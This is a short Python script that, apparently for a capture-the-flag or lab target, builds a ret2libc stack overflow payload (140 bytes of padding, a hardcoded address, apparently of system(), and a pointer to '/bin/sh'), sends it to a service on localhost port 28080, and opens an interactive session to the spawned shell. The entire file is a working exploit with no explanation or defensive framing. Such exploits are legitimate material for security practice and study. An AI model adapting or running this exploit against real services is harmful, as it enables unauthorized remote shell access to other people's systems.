import socket
import time
import struct
import telnetlib



def main():
    buf = b'A' * 140
    buf += struct.pack('<I', 0xf7e29d10)
    buf += b'A' * 4
    buf += struct.pack('<I', 0xffffd470 + 140 + 12)
    buf += b'/bin/sh'

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(("localhost", 28080))
    time.sleep(1)
    print(buf)
    sock.sendall(buf)

    print("interact mode")
    t = telnetlib.Telnet()
    t.sock = sock
    t.interact()



if __name__ == "__main__":
    main()
